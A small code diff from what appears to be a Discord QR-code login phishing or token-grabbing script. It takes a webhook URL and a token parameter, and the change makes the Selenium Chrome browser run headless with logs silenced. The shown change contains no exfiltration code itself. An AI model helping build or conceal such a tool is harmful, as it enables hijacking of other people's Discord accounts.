@@ -42,9 +42,12 @@ def get_discord_info(tk, link_int):
 def main(webhook_url) -> None:
     Write.Print("\n\n[!] Generating Qr-Code...", Colors.red_to_purple)
     opts = webdriver.ChromeOptions()
+    try:
+        opts.headless = True
+    except:
+        opts.add_argument('--headless')
     opts.add_experimental_option("detach", True)
     opts.add_experimental_option('excludeSwitches', ['enable-logging'])
-    opts.headless = True
     opts.add_argument('--log-level 3')
     from webdriver_manager.chrome import ChromeDriverManager # Importing the module here because it has conflict with pystyle.
     os.environ['WDM_LOG_LEVEL'] = '0'
